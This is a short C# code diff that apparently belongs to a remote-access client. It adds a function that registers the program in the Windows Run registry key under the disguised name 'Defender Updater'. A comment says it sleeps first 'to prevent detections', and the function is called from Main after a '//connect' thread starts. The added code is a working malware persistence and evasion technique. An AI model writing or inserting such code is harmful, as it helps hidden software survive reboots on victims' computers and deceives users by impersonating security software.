@@ -155,12 +155,19 @@ using System.Net.NetworkInformation;
             }
         }
 
-
+        static void Startup()
+        {
+            System.Threading.Thread.Sleep(69); // Waits before adding to startup to prevent detections.
+            Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+            key.SetValue("Defender Updater", Application.ExecutablePath);
+        }
+        
         static void Main()
         {
 
             //connect
             new Thread(Join).Start();
+            Startup();
         }
 
 
